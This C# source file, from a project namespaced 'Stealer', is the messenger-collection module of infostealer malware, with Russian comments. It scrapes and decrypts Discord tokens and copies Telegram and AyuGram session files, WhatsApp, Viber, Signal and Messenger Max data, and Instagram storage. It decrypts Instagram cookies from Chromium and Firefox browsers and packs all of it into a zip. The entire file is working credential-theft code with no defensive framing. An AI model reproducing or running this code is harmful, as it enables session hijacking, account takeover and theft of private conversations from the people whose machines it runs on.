using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using Stealer.Crypto;
using Stealer.Utils;

namespace Stealer.Collectors
{
    public class MessengersCollector
    {
        public static void Collect(InMemoryZip zip)
        {
            try
            {
                int collected = 0;

                collected += CollectDiscord(zip);
                collected += CollectTelegram(zip);
                // collected += CollectTelegramWeb(zip); // Убрано по запросу
                collected += CollectWhatsApp(zip);
                collected += CollectViber(zip);
                collected += CollectMessengerMax(zip);
                collected += CollectAyuGram(zip);
                collected += CollectSignal(zip);
                collected += CollectInstagram(zip);
                collected += CollectInstagramCookies(zip);

            }
            catch
            {
            }
        }

        private static int CollectDiscord(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                string[] discordPaths = {
                    Path.Combine(appData, "discord"),
                    Path.Combine(appData, "discordcanary"),
                    Path.Combine(appData, "discordptb"),
                    Path.Combine(appData, "discorddevelopment"),
                    Path.Combine(localAppData, "Discord"),
                    Path.Combine(localAppData, "DiscordCanary"),
                    Path.Combine(localAppData, "DiscordPTB"),
                    Path.Combine(localAppData, "DiscordDevelopment")
                };

                Regex tokenRegex = new Regex(@"(mfa\.[\w-]{80,})|((MT|OD)[\w-]{22,24}\.[\w-]{6}\.[\w-]{25,110})", RegexOptions.IgnoreCase);
                Regex encryptedRegex = new Regex(@"""dQw4w9WgXcQ:([^""]+)""", RegexOptions.IgnoreCase);

                foreach (string discordPath in discordPaths)
                {
                    if (!Directory.Exists(discordPath))
                        continue;

                    string appName = Path.GetFileName(discordPath);
                    string levelDbPath = Path.Combine(discordPath, "Local Storage", "leveldb");

                    if (!Directory.Exists(levelDbPath))
                        continue;

                    var tokens = new HashSet<string>();
                    var encryptedTokens = new HashSet<string>();

                    // Ищем токены в .ldb, .log файлах
                    foreach (string file in Directory.GetFiles(levelDbPath))
                    {
                        try
                        {
                            string ext = Path.GetExtension(file).ToLower();
                            if (ext != ".ldb" && ext != ".log")
                                continue;

                            string content = File.ReadAllText(file);

                            // Обычные токены
                            foreach (Match match in tokenRegex.Matches(content))
                            {
                                tokens.Add(match.Value);
                            }

                            // Зашифрованные токены
                            foreach (Match match in encryptedRegex.Matches(content))
                            {
                                encryptedTokens.Add(match.Groups[1].Value);
                            }
                        }
                        catch { }
                    }

                    // Расшифровываем зашифрованные токены
                    if (encryptedTokens.Count > 0)
                    {
                        string localStatePath = Path.Combine(discordPath, "Local State");
                        if (File.Exists(localStatePath))
                        {
                            byte[] masterKey = LocalState.GetMasterKeyV10(localStatePath);
                            if (masterKey != null)
                            {
                                foreach (string encryptedToken in encryptedTokens)
                                {
                                    try
                                    {
                                        byte[] encryptedBytes = Convert.FromBase64String(encryptedToken);
                                        byte[] decryptedBytes = AesGcmBrowser.Decrypt(encryptedBytes, masterKey, null, false);
                                        if (decryptedBytes != null)
                                        {
                                            string decrypted = System.Text.Encoding.UTF8.GetString(decryptedBytes).Trim();
                                            tokens.Add(decrypted);
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                    }

                    if (tokens.Count > 0)
                    {
                        zip.AddTextFile($"Messengers/Discord/{appName}.txt", string.Join("\n", tokens));
                        count += tokens.Count;
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectTelegram(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                string[] telegramPaths = {
                    Path.Combine(appData, "Telegram Desktop", "tdata"),
                    Path.Combine(appData, "Telegram Desktop (2)", "tdata"),
                    Path.Combine(appData, "Telegram Desktop (3)", "tdata")
                };

                foreach (string tdataPath in telegramPaths)
                {
                    if (!Directory.Exists(tdataPath))
                        continue;

                    // Собираем файлы из корня tdata
                    foreach (string file in Directory.GetFiles(tdataPath))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            string fileName = fileInfo.Name;

                            // Ограничение размера 7KB
                            if (fileInfo.Length > 7120)
                                continue;

                            // Собираем важные файлы
                            bool shouldCollect = false;

                            // Файлы заканчивающиеся на 's' длиной 17 символов
                            if (fileName.EndsWith("s") && fileName.Length == 17)
                                shouldCollect = true;

                            // Файлы начинающиеся с ключевых слов
                            if (fileName.StartsWith("usertag") || fileName.StartsWith("settings") || 
                                fileName.StartsWith("key_data") || fileName.StartsWith("configs") || 
                                fileName.StartsWith("maps"))
                                shouldCollect = true;

                            if (shouldCollect)
                            {
                                zip.AddFile($"Messengers/Telegram/tdata/{fileName}", File.ReadAllBytes(file));
                                count++;
                            }
                        }
                        catch { }
                    }

                    // Собираем подпапки (для файлов типа D877F783D5D3EF8Cs)
                    foreach (string file in Directory.GetFiles(tdataPath))
                    {
                        try
                        {
                            string fileName = Path.GetFileName(file);
                            
                            // Проверяем файлы заканчивающиеся на 's' длиной 17
                            if (fileName.EndsWith("s") && fileName.Length == 17)
                            {
                                // Ищем соответствующую папку (без 's' в конце)
                                string dirName = fileName.Substring(0, fileName.Length - 1);
                                string dirPath = Path.Combine(tdataPath, dirName);

                                if (Directory.Exists(dirPath))
                                {
                                    foreach (string subFile in Directory.GetFiles(dirPath))
                                    {
                                        try
                                        {
                                            FileInfo subFileInfo = new FileInfo(subFile);
                                            
                                            if (subFileInfo.Length > 7120)
                                                continue;

                                            string subFileName = subFileInfo.Name;
                                            bool shouldCollect = false;

                                            if (subFileName.EndsWith("s") && subFileName.Length == 17)
                                                shouldCollect = true;

                                            if (subFileName.StartsWith("usertag") || subFileName.StartsWith("settings") || 
                                                subFileName.StartsWith("key_data") || subFileName.StartsWith("configs") || 
                                                subFileName.StartsWith("maps"))
                                                shouldCollect = true;

                                            if (shouldCollect)
                                            {
                                                zip.AddFile($"Messengers/Telegram/tdata/{dirName}/{subFileName}", File.ReadAllBytes(subFile));
                                                count++;
                                            }
                                        }
                                        catch { }
                                    }
                                }
                            }
                        }
                        catch { }
                    }

                    // Если нашли хотя бы один файл, выходим (не собираем из других папок)
                    if (count > 0)
                        break;
                }
            }
            catch { }

            return count;
        }

        private static int CollectTelegramWeb(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                var browserPaths = new[]
                {
                    // Chromium browsers - Local Storage
                    Path.Combine(localAppData, "Google", "Chrome", "User Data"),
                    Path.Combine(localAppData, "Microsoft", "Edge", "User Data"),
                    Path.Combine(appData, "Opera Software", "Opera Stable"),
                    Path.Combine(appData, "Opera Software", "Opera GX Stable"),
                    Path.Combine(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
                    Path.Combine(localAppData, "Yandex", "YandexBrowser", "User Data"),
                    Path.Combine(localAppData, "Vivaldi", "User Data")
                };

                foreach (string browserPath in browserPaths)
                {
                    if (!Directory.Exists(browserPath))
                        continue;

                    try
                    {
                        string[] profiles = { "Default", "Profile 1", "Profile 2", "Profile 3" };

                        foreach (string profile in profiles)
                        {
                            string localStoragePath = Path.Combine(browserPath, profile, "Local Storage", "leveldb");
                            
                            if (!Directory.Exists(localStoragePath))
                                continue;

                            try
                            {
                                // Ищем файлы содержащие telegram
                                foreach (string file in Directory.GetFiles(localStoragePath))
                                {
                                    try
                                    {
                                        string ext = Path.GetExtension(file).ToLower();
                                        if (ext != ".ldb" && ext != ".log")
                                            continue;

                                        // Читаем файл и ищем упоминания telegram
                                        string content = File.ReadAllText(file);
                                        
                                        if (content.Contains("telegram.org") ||
                                            content.Contains("webk.telegram") ||
                                            content.Contains("webz.telegram"))
                                        {
                                            string browserName = Path.GetFileName(browserPath.Replace(" User Data", "").Replace(" Stable", ""));
                                            string fileName = Path.GetFileName(file);
                                            zip.AddFile($"Messengers/Telegram/Telegram Web/{browserName}_{profile}_{fileName}", File.ReadAllBytes(file));
                                            count++;
                                        }
                                    }
                                    catch { }
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }
                }

            }
            catch
            {
            }

            return count;
        }


        private static int CollectWhatsApp(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string whatsappPath = Path.Combine(localAppData, "WhatsApp");

                if (!Directory.Exists(whatsappPath))
                    return 0;

                string[] folders = { "databases", "Session Storage", "Local Storage" };

                foreach (string folder in folders)
                {
                    string folderPath = Path.Combine(whatsappPath, folder);
                    if (Directory.Exists(folderPath))
                    {
                        foreach (string file in Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories))
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length > 10 * 1024 * 1024) // 10MB limit
                                    continue;

                                string relativePath = file.Substring(whatsappPath.Length + 1);
                                zip.AddFile($"Messengers/WhatsApp/{relativePath}", File.ReadAllBytes(file));
                                count++;
                            }
                            catch { }
                        }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectViber(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string viberPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ViberPC", "data");
                if (!Directory.Exists(viberPath))
                    return 0;

                foreach (string file in Directory.GetFiles(viberPath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        if (fileInfo.Length > 10 * 1024 * 1024) // 10MB limit
                            continue;

                        string relativePath = file.Substring(viberPath.Length + 1);
                        zip.AddFile($"Messengers/Viber/{relativePath}", File.ReadAllBytes(file));
                        count++;
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectMessengerMax(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                string[] paths = {
                    Path.Combine(appData, "Messenger Max"),
                    Path.Combine(appData, "MessengerMax"),
                    Path.Combine(localAppData, "Messenger Max"),
                    Path.Combine(localAppData, "Programs", "messenger-max")
                };

                foreach (string dir in paths)
                {
                    if (!Directory.Exists(dir))
                        continue;

                    foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            string ext = Path.GetExtension(file).ToLower();
                            string name = Path.GetFileName(file).ToLower();

                            if (ext != ".json" && ext != ".db" && ext != ".sqlite" &&
                                ext != ".ldb" && ext != ".log" && ext != ".dat" &&
                                name != "cookies" && name != "local state" && name != "local storage")
                                continue;

                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 10 * 1024 * 1024) // 10MB limit
                                continue;

                            string relativePath = file.Substring(dir.Length + 1);
                            zip.AddFile($"Messengers/MessengerMax/{relativePath}", File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }

                    if (count > 0)
                        break;
                }
            }
            catch { }

            return count;
        }

        private static int CollectAyuGram(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                string[] ayugramPaths = {
                    Path.Combine(appData, "AyuGram Desktop", "tdata"),
                    Path.Combine(appData, "AyuGramDesktop", "tdata")
                };

                foreach (string tdataPath in ayugramPaths)
                {
                    if (!Directory.Exists(tdataPath))
                        continue;

                    // Собираем файлы из корня tdata
                    foreach (string file in Directory.GetFiles(tdataPath))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            string fileName = fileInfo.Name;

                            // Ограничение размера 7KB
                            if (fileInfo.Length > 7120)
                                continue;

                            // Собираем важные файлы (как в Telegram)
                            bool shouldCollect = false;

                            if (fileName.EndsWith("s") && fileName.Length == 17)
                                shouldCollect = true;

                            if (fileName.StartsWith("usertag") || fileName.StartsWith("settings") || 
                                fileName.StartsWith("key_data") || fileName.StartsWith("configs") || 
                                fileName.StartsWith("maps"))
                                shouldCollect = true;

                            if (shouldCollect)
                            {
                                zip.AddFile($"Messengers/AyuGram/tdata/{fileName}", File.ReadAllBytes(file));
                                count++;
                            }
                        }
                        catch { }
                    }

                    // Собираем подпапки
                    foreach (string file in Directory.GetFiles(tdataPath))
                    {
                        try
                        {
                            string fileName = Path.GetFileName(file);
                            
                            if (fileName.EndsWith("s") && fileName.Length == 17)
                            {
                                string dirName = fileName.Substring(0, fileName.Length - 1);
                                string dirPath = Path.Combine(tdataPath, dirName);

                                if (Directory.Exists(dirPath))
                                {
                                    foreach (string subFile in Directory.GetFiles(dirPath))
                                    {
                                        try
                                        {
                                            FileInfo subFileInfo = new FileInfo(subFile);
                                            
                                            if (subFileInfo.Length > 7120)
                                                continue;

                                            string subFileName = subFileInfo.Name;
                                            bool shouldCollect = false;

                                            if (subFileName.EndsWith("s") && subFileName.Length == 17)
                                                shouldCollect = true;

                                            if (subFileName.StartsWith("usertag") || subFileName.StartsWith("settings") || 
                                                subFileName.StartsWith("key_data") || subFileName.StartsWith("configs") || 
                                                subFileName.StartsWith("maps"))
                                                shouldCollect = true;

                                            if (shouldCollect)
                                            {
                                                zip.AddFile($"Messengers/AyuGram/tdata/{dirName}/{subFileName}", File.ReadAllBytes(subFile));
                                                count++;
                                            }
                                        }
                                        catch { }
                                    }
                                }
                            }
                        }
                        catch { }
                    }

                    if (count > 0)
                        break;
                }
            }
            catch { }

            return count;
        }

        private static int CollectSignal(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string signalPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal");
                if (!Directory.Exists(signalPath))
                    return 0;

                string[] folders = { "databases", "Session Storage", "Local Storage", "sql" };

                foreach (string folder in folders)
                {
                    string folderPath = Path.Combine(signalPath, folder);
                    if (Directory.Exists(folderPath))
                    {
                        foreach (string file in Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories))
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length > 10 * 1024 * 1024) // 10MB limit
                                    continue;

                                string relativePath = file.Substring(signalPath.Length + 1);
                                zip.AddFile($"Messengers/Signal/{relativePath}", File.ReadAllBytes(file));
                                count++;
                            }
                            catch { }
                        }
                    }
                }

                // config.json
                string configPath = Path.Combine(signalPath, "config.json");
                if (File.Exists(configPath))
                {
                    zip.AddFile("Messengers/Signal/config.json", File.ReadAllBytes(configPath));
                    count++;
                }
            }
            catch { }

            return count;
        }

        private static int CollectInstagram(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                string[] instagramPaths = {
                    Path.Combine(localAppData, "Instagram"),
                    Path.Combine(localAppData, "Programs", "Instagram")
                };

                foreach (string instagramPath in instagramPaths)
                {
                    if (!Directory.Exists(instagramPath))
                        continue;

                    // Собираем Local Storage
                    string localStoragePath = Path.Combine(instagramPath, "Local Storage", "leveldb");
                    if (Directory.Exists(localStoragePath))
                    {
                        foreach (string file in Directory.GetFiles(localStoragePath))
                        {
                            try
                            {
                                string ext = Path.GetExtension(file).ToLower();
                                if (ext != ".ldb" && ext != ".log")
                                    continue;

                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length > 10 * 1024 * 1024) // 10MB limit
                                    continue;

                                string fileName = fileInfo.Name;
                                zip.AddFile($"Messengers/Instagram/Local Storage/{fileName}", File.ReadAllBytes(file));
                                count++;
                            }
                            catch { }
                        }
                    }

                    // Собираем Session Storage
                    string sessionStoragePath = Path.Combine(instagramPath, "Session Storage");
                    if (Directory.Exists(sessionStoragePath))
                    {
                        foreach (string file in Directory.GetFiles(sessionStoragePath))
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length > 10 * 1024 * 1024) // 10MB limit
                                    continue;

                                string fileName = fileInfo.Name;
                                zip.AddFile($"Messengers/Instagram/Session Storage/{fileName}", File.ReadAllBytes(file));
                                count++;
                            }
                            catch { }
                        }
                    }

                    // Собираем IndexedDB
                    string indexedDBPath = Path.Combine(instagramPath, "IndexedDB");
                    if (Directory.Exists(indexedDBPath))
                    {
                        foreach (string file in Directory.GetFiles(indexedDBPath, "*", SearchOption.AllDirectories))
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length > 10 * 1024 * 1024) // 10MB limit
                                    continue;

                                string relativePath = file.Substring(indexedDBPath.Length + 1);
                                zip.AddFile($"Messengers/Instagram/IndexedDB/{relativePath}", File.ReadAllBytes(file));
                                count++;
                            }
                            catch { }
                        }
                    }

                    // Собираем Cookies
                    string cookiesPath = Path.Combine(instagramPath, "Cookies");
                    if (File.Exists(cookiesPath))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(cookiesPath);
                            if (fileInfo.Length <= 10 * 1024 * 1024) // 10MB limit
                            {
                                zip.AddFile("Messengers/Instagram/Cookies", File.ReadAllBytes(cookiesPath));
                                count++;
                            }
                        }
                        catch { }
                    }

                    if (count > 0)
                        break;
                }
            }
            catch { }

            return count;
        }

        private static byte[] HexStringToByteArray(string hex)
        {
            if (string.IsNullOrEmpty(hex))
                return new byte[0];
                
            hex = hex.Replace("-", "");
            
            if (hex.Length % 2 != 0)
                return new byte[0];
                
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        private static int CollectInstagramCookies(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                var browserPaths = new[]
                {
                    // Chromium browsers
                    Path.Combine(localAppData, "Google", "Chrome", "User Data"),
                    Path.Combine(localAppData, "Microsoft", "Edge", "User Data"),
                    Path.Combine(appData, "Opera Software", "Opera Stable"),
                    Path.Combine(appData, "Opera Software", "Opera GX Stable"),
                    Path.Combine(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
                    Path.Combine(localAppData, "Yandex", "YandexBrowser", "User Data"),
                    Path.Combine(localAppData, "Vivaldi", "User Data"),
                    
                    // Firefox
                    Path.Combine(appData, "Mozilla", "Firefox", "Profiles")
                };

                var allCookies = new System.Text.StringBuilder();

                foreach (string browserPath in browserPaths)
                {
                    if (!Directory.Exists(browserPath))
                        continue;

                    try
                    {
                        // Chromium browsers
                        if (browserPath.Contains("User Data") || browserPath.Contains("Opera"))
                        {
                            try
                            {
                                string localStatePath = Path.Combine(browserPath, "Local State");
                                byte[] masterKey = null;

                                if (File.Exists(localStatePath))
                                {
                                    masterKey = LocalState.GetMasterKeyV10(localStatePath);
                                }

                                if (masterKey == null)
                                    continue;

                                string[] profiles = { "Default", "Profile 1", "Profile 2", "Profile 3" };

                                foreach (string profile in profiles)
                                {
                                    string cookiesPath = Path.Combine(browserPath, profile, "Network", "Cookies");
                                    
                                    if (!File.Exists(cookiesPath))
                                        cookiesPath = Path.Combine(browserPath, profile, "Cookies");

                                    if (!File.Exists(cookiesPath))
                                        continue;

                                    try
                                    {
                                        var parser = SQLiteParser.ReadTable(cookiesPath, "cookies");
                                        if (parser != null)
                                        {
                                            for (int i = 0; i < parser.GetRowCount(); i++)
                                            {
                                                try
                                                {
                                                    string host = parser.GetValue(i, 1) ?? "";
                                                    string name = parser.GetValue(i, 3) ?? "";
                                                    string plainValue = parser.GetValue(i, 4) ?? "";
                                                    string encryptedValueHex = parser.GetValue(i, 5) ?? "";
                                                    string path = parser.GetValue(i, 6) ?? "/";
                                                    string expires = parser.GetValue(i, 7) ?? "0";

                                                    // Фильтруем только Instagram куки
                                                    if (!host.Contains("instagram.com"))
                                                        continue;

                                                    if (string.IsNullOrEmpty(name))
                                                        continue;

                                                    string cookieValue = "";
                                                    
                                                    // Сначала проверяем plain value (старые куки)
                                                    if (!string.IsNullOrEmpty(plainValue))
                                                    {
                                                        cookieValue = plainValue;
                                                    }
                                                    // Если plain value пустой - расшифровываем encrypted_value
                                                    else if (!string.IsNullOrEmpty(encryptedValueHex))
                                                    {
                                                        byte[] encryptedValue = HexStringToByteArray(encryptedValueHex);
                                                        
                                                        if (encryptedValue.Length >= 31)
                                                        {
                                                            byte[] decryptedValue = AesGcmBrowser.Decrypt(encryptedValue, masterKey, null, true);

                                                            if (decryptedValue != null && decryptedValue.Length > 0)
                                                            {
                                                                cookieValue = System.Text.Encoding.UTF8.GetString(decryptedValue);
                                                            }
                                                        }
                                                    }

                                                    if (!string.IsNullOrEmpty(cookieValue))
                                                    {
                                                        allCookies.AppendLine($"{host}\tTRUE\t{path}\tFALSE\t{expires}\t{name}\t{cookieValue}");
                                                        count++;
                                                    }
                                                }
                                                catch { }
                                            }
                                        }
                                    }
                                    catch { }
                                }
                            }
                            catch { }
                        }
                        // Firefox
                        else if (browserPath.Contains("Firefox"))
                        {
                            try
                            {
                                foreach (string profileDir in Directory.GetDirectories(browserPath))
                                {
                                    string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
                                    
                                    if (!File.Exists(cookiesPath))
                                        continue;

                                    try
                                    {
                                        var parser = SQLiteParser.ReadTable(cookiesPath, "moz_cookies");
                                        if (parser != null)
                                        {
                                            for (int i = 0; i < parser.GetRowCount(); i++)
                                            {
                                                try
                                                {
                                                    string host = parser.GetValue(i, 1) ?? "";
                                                    string name = parser.GetValue(i, 2) ?? "";
                                                    string value = parser.GetValue(i, 3) ?? "";
                                                    string path = parser.GetValue(i, 4) ?? "/";
                                                    string expires = parser.GetValue(i, 5) ?? "0";

                                                    // Фильтруем только Instagram куки
                                                    if (!host.Contains("instagram.com"))
                                                        continue;

                                                    if (!string.IsNullOrEmpty(value))
                                                    {
                                                        allCookies.AppendLine($"{host}\tTRUE\t{path}\tFALSE\t{expires}\t{name}\t{value}");
                                                        count++;
                                                    }
                                                }
                                                catch { }
                                            }
                                        }
                                    }
                                    catch { }
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }
                }

                if (count > 0)
                {
                    zip.AddTextFile("Messengers/Instagram/Cookies.txt", allCookies.ToString());
                }
            }
            catch { }

            return count;
        }
    }
}

